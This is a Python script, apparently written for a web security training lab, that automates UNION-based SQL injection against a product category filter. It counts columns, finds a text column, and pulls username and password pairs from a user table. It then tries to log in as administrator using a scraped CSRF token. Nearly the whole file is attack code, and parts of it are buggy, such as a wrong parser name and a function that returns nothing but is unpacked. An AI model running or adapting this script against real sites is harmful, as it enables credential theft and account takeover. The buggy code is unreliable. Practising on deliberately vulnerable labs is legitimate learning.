import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

#Format the username and passwords
def usernameandpassword(r):
   soup = BeautifulSoup(r.text, 'html.parser')
   table = soup.find('table', class_='is-table-list')
   for data in table.find_all('tbody'):
      rows = data.find_all('tr')
      for row in rows:
         cred = row.find_all('th')[0].text
         if (cred[13] == "administrator"):
            return cred[13], cred[14:]

#Formats for csrf
def getCSRF(s):
   soup = BeautifulSoup(s.text, 'html-parser')
   csrf = soup.find('input')['value']
   return csrf



#Find number of columns
def numofcolumns(url):
    payload = "' UNION SELECT"
    columnnum = " NULL"
    ending = "--"
    for i in range(1,10):
       if (i == 1):
        payload1 = payload + columnnum
       else:
          payload1 = payload1 +',' + columnnum
       fullpayload = url + payload1 + ending
       r = requests.get(fullpayload, verify=False, proxies=proxies)
       if r.status_code == 200:
          return i, fullpayload, payload1










#See which column is of string type
def columnstring(fullurl):
   no, fullurl2, fullpayload = numofcolumns(fullurl)
   print(fullpayload)
   fullpayload2 = fullpayload
   payload1,payload2 = fullpayload2[:len(fullpayload2)//2],fullpayload[len(fullpayload2)//2:]
   list_p = payload2.replace(",","").split()
   print('The no of columns is %s' %no)
   print('The payload is %s' %fullurl2)
   payloadstr = "'abc'"
   list_p = payload2.replace(",","").split()
   for i in range(1,len(list_p)):
      list_p[i] = payloadstr
      print(list_p[i])
      strpay = ", ".join(list_p)
      print(strpay)
      fullurlpayload = fullurl + payload1 + strpay
      print(fullurlpayload)
      q = requests.get(fullurlpayload, verify=False, proxies=proxies)

      if (q.status_code == 500):
         list_p[i] = "NULL"
         strpay = ", ".join(list_p)

      else:
         print ("The %snd column is a string " %i)
         break







#Enter payload to get admins username and password
def unionpayload(fullurl, column1, column2, table):
   payload = "' UNION SELECT NULL, {0} || '~' || {1} FROM {2} --".format(column1, column2, table)
   fullurlpayload = fullurl + payload
   r = requests.get(fullurlpayload, verify=False, proxies=proxies)
   usernameandpassword(r)

#login as admin
def logging(fullurl, column1, column2, table):
   s = requests.Session()
   r = s.get(fullurl, verify=False, proxies=proxies)
   csrf = getCSRF(r)
   username, password = unionpayload(fullurl, column1, column2, table)
   data = {
      'csrf': csrf,
      'username': username,
      'password': password

   }

   q = s.post(fullurl, verify=False, proxies=proxies, data=data)
   if q.status_code == 200:
      print("[+] SQL Injection succesfully exploited ...... logged in as admin")
   else:
      print("[+] SQL not exploited ......... could not be succesfully exploited")



if "__main__" == __name__:
    try:
        url = sys.argv[1].strip()
        uri = "/filter?category=Gifts"
        fullurl = url + uri
        column1= sys.argv[2].strip()
        column2= sys.argv[3].strip()
        table = sys.argv[4].strip()

    except IndexError:
        print('[+] Usage <url> <columnname> <columnname2> <tablename>%s' %sys.argv[0])
        print("[+] Example example.com column column1 users %s"%sys.argv[0])
        sys.exit(1)

    columnstring(fullurl)
    unionpayload(fullurl, column1, column2, table)


